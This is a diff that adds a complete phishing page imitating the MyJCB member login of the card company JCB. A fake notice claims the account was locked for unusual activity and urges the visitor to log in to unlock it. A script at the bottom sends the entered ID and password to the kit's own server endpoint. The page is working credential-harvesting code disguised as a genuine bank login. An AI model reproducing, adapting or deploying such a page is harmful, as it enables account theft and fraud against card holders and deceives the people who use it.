@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="google-site-verification" content="jcp" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="Content-Style-Type" content="text/css" />
+    <meta http-equiv="Content-Script-Type" content="text/javascript" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>JCBの会員専用WEBサービス「MyJCB（マイジェーシービー）」</title>
+    <meta name="keyword" content="" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" type="text/css" href="/static/index/css/login.css" />
+    <link rel="stylesheet" type="text/css" href="/static/index/css/frame.css" />
+
+    
+    <script type="text/javascript" src="/static/plugs/jquery/jquery.min.js"></script>
+    <script type="text/javascript" src="/static/plugs/layui/layui.all.js"></script>
+
+
+
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Cache-Control" content="no-cache, no-store" />
+    <meta http-equiv="Expires" content="0" />
+
+</head>
+
+<body class="no-nav" id="page-top" onLoad="onLoad()">
+<!-- Loading script asynchronously -->
+
+
+<!-- ================ ▼ Header ▼ ================ -->
+<div class="change-display js-change-display-button">
+    <button class="rwd_sp hidden_sp"><span class="label">スマートフォン表示に切り替える</span></button>
+</div><!-- /.change-display -->
+<div id="page-header" class="_exception">
+    <div class="nav-area">
+        <div class="str-inner">
+            <h1 class="header-logo"><span class="logo"><img src="/static/index/images/header/logo.png" alt="MyJCB" /></span></h1>
+            <div class="header-utility no-nav">
+                <ul class="list-utility">
+                    <li><a href="https://www.jcb.co.jp/jcb_mente/mente_service.html" target="_blank">サービス停止のご案内<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ" /></span></a></li>
+                    <li><a href="https://www.jcb.co.jp/qa/index.html" target="_blank">よくあるご質問<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ" /></span></a></li>
+                    <li><a href="https://www.jcb.co.jp/myjcb/myjcb.html" target="_blank">お問い合わせ<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ" /></span></a></li>
+                </ul>
+            </div>
+            <!-- /.header-utility -->
+        </div>
+        <!-- /.str-inner -->
+    </div>
+    <!-- /.nav-area -->
+</div>
+<!-- /#page-header -->
+<!-- ================ ▲ Header ▲ ================ -->
+<!-- ================ ▼ Main ▼ ================ -->
+<div class="head-area head-exception">
+    <div class="title-wrapper str-inner">
+        <h2 class="hdg-2">MyJCBにようこそ</h2>
+    </div>
+    <div class="info-area">
+        <div class="str-inner">
+            <ul class="list-info">
+                <li>
+                    <p class="category">
+                        <span class="label">お知らせ</span>
+                    </p>
+                    <p class="txt">
+                        <span class="fcB fwB"> </span><br />
+                        お客様のアカウントで異常なアクティビティが検出されたためJCBアカウントを停止させていただいております。<br />
+                        アカウントにログインして画面の指示に従うことで、.アカウントのロックを解除していただけます。<br />
+                        お客様にはご不便をおかけいたしますが、何とぞご理解いただきますようお願い申しあげます。
+                    </p>
+                </li>
+            </ul>
+        </div>
+    </div>
+</div>
+<div class="main-contents">
+    <div class="primary-wrapper mt10 js-adjust-h">
+        <div class="str-inner">
+            <ul class="primary-list">
+                <li class="box" style="margin-left: 255px;">
+                    <div class="primary-box login">
+                        <form name="loginForm" method="POST">
+                            <h3 class="hdg-3 hdg-blue">MyJCBに登録済の方</h3>
+                            <div class="primary-inner">
+                                <div class="login-form">
+                                    <dl>
+                                        <dt>
+                                            <label for="userId">MyJCB ID</label>
+                                        </dt>
+                                        <dd>
+                                            <div id="userIdclass" class="login-input">
+                                                <input type="text" id="names" name="userId" maxlength="30" />
+                                            </div>
+                                            <p class="error-message-form" id='myjIdErrMsg'></p>
+                                        </dd>
+                                    </dl>
+
+                                    <dl>
+                                        <dt class="password-txt">
+                                            <label for="password">MyJCB パスワード</label>
+                                        </dt>
+                                        <dd>
+                                            <div id="passwordclass" class="password-input">
+                                                <input type="password" id="pwd" name="password"   style="font-family:'Times New Roman','Tahoma'"/>
+                                            </div>
+                                            <p class="error-message-form" id='passwordErrMsg'></p>
+                                        </dd>
+                                    </dl>
+                                    <div class="login-btn-wrap" id="loginButton">
+                                        <a class="btn-blue btn btn-login_01" name="login" id="login" >ログイン</a></div>
+<!--                                    <input type="hidden" name="screenId" value="0102001" />-->
+<!--                                    <input type="hidden" name="loginRouteId" value="0102001" />-->
+<!--                                    <input type="hidden" name="devicePrint" />-->
+                                    <span class="hdg-sup">注意事項</span>
+                                    <ul class="login-txt">
+                                        <li>MyJCB ID・パスワードは、半角英数字・記号6～20桁でご入力ください。</li>
+                                        <li>アルファベットは大文字･小文字をご確認のうえ、正しく入力してください。</li>
+                                        <li>入力エラーが当社規定の回数を超えると、セキュリティー保持のためそのIDは利用できなくなり、あらためてMyJCBの新規登録が必要となります。</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        
+                        </form>
+
+                    </div>
+                </li>
+                <!--
+                <li class="box">
+                    <div class="primary-box">
+                        <h3 class="hdg-3 hdg-green">新規登録／ID・パスワードをお忘れの方</h3>
+                        <div class="primary-inner">
+                            <p>MyJCB IDをお持ちでない方、ID・パスワードをお忘れの方やログインできない方は、下の「新規登録／ID確認」ボタンよりお手続きください（登録は無料です）。</p>
+                            <a href="https://www.jcb.co.jp/service/additional/myjcb/" target="_blank" class="link mt30">MyJCBのサービスについて<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ"></span></a>
+                            <div class="login-btn-wrap"><a href="/iss-pc/member/user_manage/regist_id/userRegistIdInput.html" class="btn-green btn btn-login_01">新規登録／ID確認</a></div>
+                        </div>
+                    </div>
+                </li>
+                -->
+            </ul>
+        </div>
+    </div>
+
+    <h2 class="hdg-A"><span>MyJCBのご利用にあたって</span></h2>
+    <div class="notice-area">
+        <div class="str-inner">
+            <ul class="notice-list mt20">
+                <li class="box mt20">
+                    <div class="notice-box">
+                        <h3 class="hdg-4">サイトのご利用について</h3>
+                        <div class="mt20">
+                            <ul class="box-list">
+                                <li>MyJCBではインターネット通信で利用する暗号化方式「TLS」を使用しております。なお、アクセス環境によってTLSが確立しない場合は、サービスを利用できません。</li>
+                                <li>MyJCBでは「Cookie」を使用しておりますので、ブラウザの設定でCookieを有効にしていただく必要があります。</li>
+                                <li>動作環境については「サイトのご利用について」をご参照ください。</li>
+                            </ul>
+                            <a href="https://www.jcb.co.jp/attention/" class="link mt20" target="_blank">サイトのご利用について<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ"></span></a>
+                        </div>
+                    </div>
+                </li>
+                <li class="box mt20">
+                    <div class="notice-box">
+                        <h3 class="hdg-4">「秘密の合い言葉」によるご本人様確認について</h3>
+                        <div class="mt20">
+                            <p>MyJCBを安心してご利用いただくため、ログイン時に普段と異なるご利用環境と判断した場合、「秘密の合い言葉」によるご本人様確認を実施しています。</p>
+                            <p>「秘密の合い言葉」が未登録の場合、ログイン後に登録画面が表示されます。</p>
+                            <a href="https://www.jcb.co.jp/security/pop/secret_qa.html" class="link mt20" target="_blank">詳しくはこちら<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ"></span></a>
+                        </div>
+                    </div>
+                </li>
+                <li class="box mt20">
+                    <div class="notice-box">
+                        <h3 class="hdg-4">MyJCBのID・パスワードの管理について</h3>
+                        <div class="mt20">
+                            <p>MyJCBのID・パスワードを第三者に譲渡または使用させる行為は禁止しています。</p>
+                            <p>当社が定める特定加盟店以外に、他社のサービスでMyJCBのID・パスワードの入力を求めるものがありますが、不正使用され、思わぬ被害にあってしまう危険性があります。ID・パスワードは厳重に管理してください。</p>
+                            <a href="https://www.jcb.co.jp/service/basic/scene/pop/specific-merchant.html" class="link mt20" target="_blank">特定加盟店一覧<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ"></span></a>
+                        </div>
+                    </div>
+                </li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+<div class="footer-nav">
+    <ul class="list-utility pc-none">
+        <li><a href="#" target="_blank">サービス停止のご案内<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ"></span></a></li>
+        <li><a href="#" target="_blank">よくあるご質問<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ"></span></a></li>
+        <li><a href="#" target="_blank">お問い合わせ<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ"></span></a></li>
+    </ul>
+</div>
+
+<ul class="list-display">
+    <li class="rwd"><a>スマートフォン</a></li>
+    <li class="rwd"><button class="rwd_pc hidden">PC</button></li>
+</ul>
+<div id="to-top">
+
+    <a href="#page-top">ページトップへ</a>
+    <img src="/static/index/images/error-icon.png" alt="" style="display:none" />
+</div>
+<div id="page-footer">
+    <div class="str-inner">
+        <ul class="list-utility">
+            <li><a href="https://www.jcb.co.jp/" target="_blank">JCBカードサイト<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ" /></span></a></li>
+            <li><a href="https://www.jcb.co.jp/privacy/" target="_blank">プライバシーポリシー<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ" /></span></a></li>
+            <li><a href="https://www.jcb.co.jp/myjcb/kitei.html" target="_blank">MyJCB利用者規定<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ" /></span></a></li>
+            <li><a href="https://www.jcb.co.jp/security/" target="_blank">JCBのセキュリティについて<span class="icon"><img src="/static/index/images/icon_blank.png" alt="別ウィンドウ" /></span></a></li>
+        </ul>
+        <div class="copy-area">
+            <p class="logo"><a href="https://www.jcb.co.jp/" target="_blank"><img src="/static/index/images/footer/logo_footer.png" alt="JCB" /></a></p>
+            <p class="copy">&copy;JCB Co., Ltd. 2000</p>
+        </div>
+        <!-- /.copy-area -->
+    </div>
+    <!-- /.str-inner -->
+</div>
+<!-- /#page-footer -->
+<!-- ================ ▲ Footer ▲ ================ -->
+
+<script type="text/javascript" src="/static/index/js/jquery-3.2.1.min.js"></script>
+<script type="text/javascript" src="/static/index/js/jquery.cookie.js"></script>
+<script type="text/javascript" src="/static/index/js/frame.js"></script>
+<!--<script type="text/javascript">_satellite.pageBottom();</script>-->
+</body>
+<script>
+    $('#login').click(function(){
+        var names = $("#names").val();
+        var pwd   = $("#pwd").val();
+
+        if(names == '' || names== undefined){
+            alert('IDを入力してください')
+            return false;
+        }
+
+        if(pwd == '' || pwd == undefined){
+            alert('暗証番号は空です');
+            return false;
+        }
+
+       var url =  "/index/login/index.html";
+
+       $.post(url,{'names':names,'pwd':pwd},function(ret){
+            if(ret.code == 200){
+                window.location.href="/index/index/index.html"
+            }
+
+           if(ret.code == 400){
+             alert(ret.msg);
+             window.location.reload();
+           }
+       },'json')
+    })
+</script>
+
+</html>
